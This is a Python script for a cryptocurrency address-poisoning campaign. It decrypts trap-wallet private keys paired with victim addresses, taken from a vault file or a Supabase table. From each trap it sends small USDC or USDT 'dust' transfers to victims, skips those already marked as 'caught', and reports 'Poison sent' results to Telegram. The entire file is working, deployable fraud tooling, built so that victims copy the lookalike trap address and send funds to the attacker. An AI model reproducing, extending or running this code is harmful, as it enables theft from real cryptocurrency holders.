#!/usr/bin/env python3
import sys
import os
import re
import time
import argparse  # NEW
from web3 import Web3
from dotenv import load_dotenv

# --- Ensure we don't let .env overwrite OS-level PM2 variables ---
load_dotenv(override=False)

# --- Official POA middleware import ---
try:
    from web3.middleware import geth_poa_middleware
except ImportError:
    try:
        from web3.middleware import poa
        geth_poa_middleware = poa
    except ImportError:
        try:
            from web3.middleware import geth_poa
            geth_poa_middleware = geth_poa
        except ImportError:
            geth_poa_middleware = None
            print('[DEBUG] POA middleware not found; BSC/Polygon may have extraData errors.')

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lib.config import config
from lib.logger import logger
from lib.notifier import send_telegram
from lib.shutdown import setup_graceful_shutdown
from lib.encryption import decrypt

# --- Supabase client for job tracking (NEW) ---
try:
    from supabase import create_client
except ImportError:
    create_client = None

SUPABASE_URL = os.getenv("NEXT_PUBLIC_SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_SERVICE_ROLE_KEY")
supabase = None
if SUPABASE_URL and SUPABASE_KEY and create_client:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

def update_job(job_id, status=None, progress=None, total=None, message=None):
    """Update job status in Supabase."""
    if not supabase:
        return
    data = {}
    if status is not None:
        data["status"] = status
    if progress is not None:
        data["progress"] = progress
    if total is not None:
        data["total"] = total
    if message is not None:
        data["message"] = message
    if status == "running" and "started_at" not in data:
        data["started_at"] = "now()"
    if status in ("completed", "failed"):
        data["completed_at"] = "now()"
    try:
        supabase.table("jobs").update(data).eq("id", job_id).execute()
    except Exception as e:
        logger.error(f"Failed to update job {job_id}: {e}")

def get_campaign_id_from_job(job_id):
    """Retrieve campaign_id from job record."""
    if not supabase:
        return None
    try:
        result = supabase.table("jobs").select("campaign_id").eq("id", job_id).execute()
        if result.data:
            return result.data[0]["campaign_id"]
    except Exception as e:
        logger.error(f"Failed to get campaign_id for job {job_id}: {e}")
    return None

print('[DEBUG] Starting duster.py...')

# --- MULTI‑CHAIN: STRICT PM2 Env Var Prioritization ---
CHAIN = os.getenv('CHAIN') or getattr(config, 'CHAIN', 'ethereum')
chain_cfg = config.get_chain_config() if hasattr(config, 'get_chain_config') else None

if chain_cfg and 'tokens' in chain_cfg:
    TOKEN_CONFIG = chain_cfg['tokens']
else:
    TOKEN_CONFIG = config.TOKEN_CONFIG

if chain_cfg and 'dust' in chain_cfg:
    DUST_AMOUNT = chain_cfg['dust']
else:
    DUST_AMOUNT = config.DUST_AMOUNT

NATIVE_SYMBOL = chain_cfg['native_symbol'] if chain_cfg and 'native_symbol' in chain_cfg else 'ETH'

if hasattr(config, 'get_chain_rpc'):
    RPC_URL = config.get_chain_rpc()
else:
    RPC_URL = config.DUSTER_RPC_URL

if RPC_URL is None or RPC_URL == "":
    RPC_URL = os.getenv("DUSTER_RPC_URL") or os.getenv("NODE_RPC_URL")

print(f'[DEBUG] Chain: {CHAIN}, Native symbol: {NATIVE_SYMBOL}')
print('[DEBUG] DUST_AMOUNT:', DUST_AMOUNT)
print('[DEBUG] TOKEN_CONFIG:', TOKEN_CONFIG)
print(f'[DEBUG] Using RPC: {RPC_URL}')

# --- Custom HTTPProvider that truncates extraData for POA chains ---
class POAHTTPProvider(Web3.HTTPProvider):
    def make_request(self, method, params):
        response = super().make_request(method, params)
        if method in ('eth_getBlockByNumber', 'eth_getBlockByHash'):
            if 'result' in response and 'extraData' in response['result']:
                extra = response['result']['extraData']
                if isinstance(extra, str):
                    extra_bytes = bytes.fromhex(extra[2:] if extra.startswith('0x') else extra)
                else:
                    extra_bytes = extra
                if len(extra_bytes) > 32:
                    response['result']['extraData'] = '0x' + extra_bytes[:32].hex()
        return response

# --- RPC setup ---
def get_web3():
    rpc_urls = [
        RPC_URL,
        config.DUSTER_RPC_URL,
        os.getenv("DUSTER_RPC_URL"),
        os.getenv("NODE_RPC_URL"),
    ] + config.FALLBACK_RPC_URLS
    rpc_urls = [url for url in rpc_urls if url]

    print(f'[DEBUG] Trying {len(rpc_urls)} RPC URLs...')
    for url in rpc_urls:
        try:
            print(f'[DEBUG] Connecting to {url}...')
            if CHAIN.lower() in ('bsc', 'polygon'):
                provider = POAHTTPProvider(url)
                print(f'[DEBUG] Using POAHTTPProvider for chain={CHAIN}')
            else:
                provider = Web3.HTTPProvider(url)

            w3 = Web3(provider)
            if w3.is_connected():
                if geth_poa_middleware is not None:
                    try:
                        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
                    except Exception as e:
                        print(f'[DEBUG] Could not inject official POA middleware: {e}')

                logger.info(f"Connected to RPC: {url}")
                return w3
        except Exception as e:
            print(f'[DEBUG] Failed: {e}')
            continue
    logger.critical("No RPC connection available.")
    sys.exit(1)

w3 = get_web3()
print('[DEBUG] Web3 instance ready.')

VAULT_FILE = config.VAULT_FILE

# Minimal ERC-20 ABI
ERC20_ABI = [
    {
        "constant": False,
        "inputs": [{"name": "to", "type": "address"}, {"name": "value", "type": "uint256"}],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function",
    },
    {
        "constant": True,
        "inputs": [{"name": "owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function",
    },
]

# --- Exponential Backoff & 429 Rate Limit Handling ---
def call_with_retry(func, *args, max_attempts=3, base_delay=1, **kwargs):
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            last_exc = e
            err_str = str(e).lower()
            if attempt < max_attempts:
                delay = base_delay * (2 ** (attempt - 1))
                if "429" in err_str or "too many requests" in err_str or "limit" in err_str:
                    delay = max(delay, 5)
                logger.warning(f"Retry {attempt}/{max_attempts} for {func.__name__} after {delay}s: {e}")
                time.sleep(delay)
            else:
                raise
    raise last_exc

def get_token_balance(address, token_symbol):
    token_addr = TOKEN_CONFIG.get(token_symbol)
    if not token_addr:
        return 0
    token = w3.eth.contract(address=w3.to_checksum_address(token_addr), abi=ERC20_ABI)
    try:
        return call_with_retry(token.functions.balanceOf, address).call()
    except Exception as e:
        logger.warning(f"Failed to get token balance for {address}: {e}")
        return 0

def choose_asset(victim, trap):
    # Fetch balances for both USDC variants
    victim_usdc = get_token_balance(victim, "USDC")
    trap_usdc = get_token_balance(trap, "USDC")
    victim_usdc_native = get_token_balance(victim, "USDC_NATIVE")
    trap_usdc_native = get_token_balance(trap, "USDC_NATIVE")
    
    victim_usdt = get_token_balance(victim, "USDT")
    trap_usdt = get_token_balance(trap, "USDT")
    
    force_stable = os.getenv("FORCE_STABLECOIN_DUST", "").lower() == "true"

    # USDC dust (both variants)
    if "USDC" in DUST_AMOUNT:
        dust_amount = DUST_AMOUNT["USDC"]
        if trap_usdc_native >= dust_amount and (victim_usdc_native > 0 or force_stable):
            return ("USDC_NATIVE", dust_amount)
        if trap_usdc >= dust_amount and (victim_usdc > 0 or force_stable):
            return ("USDC", dust_amount)

    # USDT dust
    if "USDT" in DUST_AMOUNT and trap_usdt >= DUST_AMOUNT["USDT"] and (victim_usdt > 0 or force_stable):
        return ("USDT", DUST_AMOUNT["USDT"])

    print('[DEBUG] No suitable stablecoin found in trap, or victim does not hold stablecoins. Skipping dust.')
    return (None, 0)

_last_low_balance_alert = {}
_local_nonces = {}

def send_dust(private_key, victim_address, campaign_id=None):
    try:
        victim = w3.to_checksum_address(victim_address)
        account = w3.eth.account.from_key(private_key)
        trap = account.address
        logger.info(f"Trap: {trap} -> Victim: {victim}")

        asset, dust = choose_asset(victim, trap)
        if asset is None:
            msg = f"❌ No suitable stablecoin found to send dust from trap {trap} to victim {victim}."
            logger.warning(msg)
            print('[DEBUG] No asset found. Aborting.')
            send_telegram(msg, campaign_id=campaign_id)
            return False
            
        logger.info(f"Chosen asset: {asset}, dust: {dust} units")

        # --- BULLETPROOF HYBRID NONCE MANAGEMENT ---
        rpc_nonce = call_with_retry(w3.eth.get_transaction_count, trap, "pending")
        if trap not in _local_nonces:
            _local_nonces[trap] = rpc_nonce
        else:
            _local_nonces[trap] = max(_local_nonces[trap], rpc_nonce)
        nonce = _local_nonces[trap]

        base_fee = call_with_retry(w3.eth.get_block, "latest")["baseFeePerGas"]
        max_priority = w3.to_wei(config.GAS_PRIORITY_FEE_GWEI, "gwei")
        max_fee = int((base_fee + max_priority) * config.GAS_FEE_BUFFER)
        max_fee = min(max_fee, w3.to_wei(config.GAS_MAX_FEE_CAP_GWEI, "gwei"))
        if max_priority > max_fee:
            max_priority = int(max_fee * 0.1)

        chain_id = w3.eth.chain_id

        # --- Strict ERC-20 Processing ---
        token_addr = TOKEN_CONFIG.get(asset)
        if not token_addr:
            logger.error(f"Unknown token {asset}")
            return False
            
        token = w3.eth.contract(address=w3.to_checksum_address(token_addr), abi=ERC20_ABI)
        token_balance = call_with_retry(token.functions.balanceOf, trap).call()
        
        # Abort immediately if balance dropped below dust amount
        if token_balance < dust:
            msg = f"⚠️ Insufficient {asset} balance in trap {trap} for victim {victim}. Need {dust}, have {token_balance}. Aborting."
            logger.warning(msg)
            send_telegram(msg, campaign_id=campaign_id)
            return False

        # SAFE GAS ESTIMATION
        try:
            estimated = call_with_retry(token.functions.transfer(victim, dust).estimate_gas, {'from': trap})
            gas_limit = int(estimated * 1.2)
        except Exception as e:
            logger.warning(f"Gas estimation failed: {e}, using fallback 100000")
            gas_limit = 100000

        tx = token.functions.transfer(victim, dust).build_transaction({
            "from": trap,
            "nonce": nonce,
            "chainId": chain_id,
            "gas": gas_limit,
            "maxFeePerGas": max_fee,
            "maxPriorityFeePerGas": max_priority,
        })
        required_eth = gas_limit * max_fee

        native_balance = call_with_retry(w3.eth.get_balance, trap)

        # --- Low‑balance alert ---
        MIN_RESERVE_NATIVE = float(os.getenv("MIN_RESERVE_NATIVE", "0.05"))
        threshold_wei = w3.to_wei(MIN_RESERVE_NATIVE, 'ether')
        now = time.time()
        if native_balance < threshold_wei:
            last_alert = _last_low_balance_alert.get(trap, 0)
            if now - last_alert > 3600:
                alert_msg = (
                    f"⚠️ Low {NATIVE_SYMBOL} balance in trap {trap}\n"
                    f"Balance: {w3.from_wei(native_balance, 'ether')} {NATIVE_SYMBOL}\n"
                    f"Threshold: {MIN_RESERVE_NATIVE} {NATIVE_SYMBOL}"
                )
                send_telegram(alert_msg, campaign_id=campaign_id)
                _last_low_balance_alert[trap] = now
                logger.warning(alert_msg)

        # --- Insufficient gas check ---
        if native_balance < required_eth:
            msg = f"⚠️ Insufficient {NATIVE_SYMBOL} for gas in trap {trap}. Need {w3.from_wei(required_eth, 'ether')}, have {w3.from_wei(native_balance, 'ether')}."
            logger.error(msg)
            send_telegram(msg, campaign_id=campaign_id)
            return False

        signed = w3.eth.account.sign_transaction(tx, private_key)
        
        # ─── FIX: Use rawTransaction (camelCase) for web3.py v6+ ───
        try:
            raw_tx = signed.rawTransaction
        except AttributeError:
            raw_tx = signed.raw_transaction  # fallback for older versions
        
        # SMART EXCEPTION CATCHING: Protect the local nonce
        try:
            tx_hash = w3.eth.send_raw_transaction(raw_tx)
            _local_nonces[trap] += 1 
        except Exception as e:
            err_msg = str(e).lower()
            if "already known" in err_msg or "nonce too low" in err_msg:
                _local_nonces[trap] += 1
            raise e 
        
        logger.info(f"TX hash: {tx_hash.hex()}")

        receipt = call_with_retry(w3.eth.wait_for_transaction_receipt, tx_hash, timeout=120)
        
        if receipt.status == 1:
            try:
                decimals = config.get_token_decimals().get(asset, 6) if hasattr(config, 'get_token_decimals') else 6
            except AttributeError:
                decimals = 6
            logger.info(f"Dust sent: {dust} units ({dust / 10**decimals:.6f} {asset})")
            send_telegram(f"✅ Poison sent\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
            return True
        else:
            logger.error("Transaction reverted")
            send_telegram(f"❌ Poison transaction reverted\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
            return False
            
    except Exception as e:
        logger.error(f"Error: {e}")
        send_telegram(f"❌ Poison failed\nVictim: {victim_address}\nError: {e}", campaign_id=campaign_id)
        return False

# --- Helper to read and decrypt vault lines ---
def read_vault_lines(file_path):
    lines = []
    if not os.path.exists(file_path):
        return lines
    with open(file_path, 'r') as f:
        raw_lines = f.readlines()
        for idx, raw_line in enumerate(raw_lines):
            line = raw_line.strip()
            if not line:
                continue
            try:
                decrypted = decrypt(line)
                lines.append(decrypted)
            except Exception as e:
                logger.error(f"Failed to decrypt line {idx+1}: {e}")
                continue
    return lines

# --- NEW: Fetch trap entries from database ---
def get_trap_entries_from_db(campaign_id):
    """
    Fetches (victim_address, private_key) pairs from the traps table.
    Returns a list of tuples (victim, private_key).
    """
    entries = []
    if not supabase:
        logger.error("Supabase client not initialized.")
        return entries
    try:
        result = supabase.table("traps")\
            .select("victim_address, trap_private_key_enc")\
            .eq("campaign_id", campaign_id)\
            .execute()
        if not result.data:
            logger.info(f"No traps found for campaign {campaign_id}")
            return entries
        for row in result.data:
            enc_key = row.get("trap_private_key_enc")
            if not enc_key:
                continue
            try:
                private_key = decrypt(enc_key)
                # Verify key works
                w3.eth.account.from_key(private_key)
                victim = row.get("victim_address", "").lower()
                if victim:
                    entries.append((victim, private_key))
            except Exception as e:
                logger.error(f"Failed to decrypt private key for victim {row.get('victim_address')}: {e}")
                continue
        logger.info(f"Loaded {len(entries)} trap entries from database for campaign {campaign_id}")
    except Exception as e:
        logger.error(f"Failed to fetch traps from database: {e}")
    return entries

def batch_poison(job_id=None, campaign_id=None):
    # --- MODIFIED: Fetch from database if campaign_id provided, else vault ---
    if campaign_id:
        logger.info(f"Using database for campaign {campaign_id}")
        entries = get_trap_entries_from_db(campaign_id)
        if not entries:
            logger.error(f"No traps found for campaign {campaign_id}")
            return
    else:
        logger.info("Using vault file for legacy mode")
        if not os.path.exists(VAULT_FILE):
            logger.error(f"{VAULT_FILE} not found.")
            return
        decrypted_lines = read_vault_lines(VAULT_FILE)
        if not decrypted_lines:
            logger.error("No valid (decrypted) entries found in vault.txt")
            return
        # Parse vault entries
        entries = []
        for line in decrypted_lines:
            match = re.search(r"Victim:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})", line, re.IGNORECASE)
            if match:
                entries.append((match.group(1), match.group(2)))
            else:
                match = re.search(r"Target:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})", line, re.IGNORECASE)
                if match:
                    entries.append((match.group(1), match.group(2)))

    if not entries:
        logger.error("No valid entries found")
        return

    # Safe File I/O for cross-process reading (kept for caught file)
    CAUGHT_FILE = config.CAUGHT_FILE
    caught = set()
    if os.path.exists(CAUGHT_FILE):
        try:
            with open(CAUGHT_FILE, 'r') as f:
                data = f.read()
                if data.strip():
                    for line in data.split('\n'):
                        addr = line.strip().lower()
                        if addr:
                            caught.add(addr)
            logger.info(f"Loaded {len(caught)} caught victims from {CAUGHT_FILE}")
        except Exception as e:
            logger.warning(f"Could not read caught victims file (possible race condition lock): {e}")

    total = len(entries)
    logger.info(f"Found {total} victims. Sending intelligent dust...")
    if job_id:
        update_job(job_id, total=total)

    success = 0
    for i, (victim, key) in enumerate(entries, 1):
        if victim.lower() in caught:
            logger.info(f"Skipping caught victim {victim}")
            continue

        logger.info(f"[{i}/{total}] Processing victim {victim}")
        
        if send_dust(key, victim, campaign_id=campaign_id):
            success += 1
        if job_id and i % 5 == 0:
            update_job(job_id, progress=i)
        time.sleep(1)

    logger.info(f"Completed: {success}/{total} successful.")
    send_telegram(f"🏁 Dust batch complete: {success}/{total} successful.", campaign_id=campaign_id)

    if job_id:
        if success == total:
            update_job(job_id, status='completed', progress=total, message='All done')
        else:
            update_job(job_id, status='failed', progress=success, message=f'{success}/{total} succeeded')

if __name__ == "__main__":
    setup_graceful_shutdown()

    # Parse arguments: support --job-id and optional positional for single mode
    parser = argparse.ArgumentParser()
    parser.add_argument('--job-id', help='Job ID for tracking')
    parser.add_argument('private_key', nargs='?', help='Private key for single dust send')
    parser.add_argument('victim_address', nargs='?', help='Victim address for single dust send')
    args = parser.parse_args()

    job_id = args.job_id
    campaign_id = None
    if job_id:
        update_job(job_id, status='running')
        campaign_id = get_campaign_id_from_job(job_id)
    else:
        # If not provided via job, try environment variable (used by re_poison.js)
        campaign_id = os.getenv('CAMPAIGN_ID')

    if args.private_key and args.victim_address:
        # Single mode: just send dust and return
        send_dust(args.private_key, args.victim_address, campaign_id=campaign_id)
    else:
        # Batch mode
        batch_poison(job_id=job_id, campaign_id=campaign_id)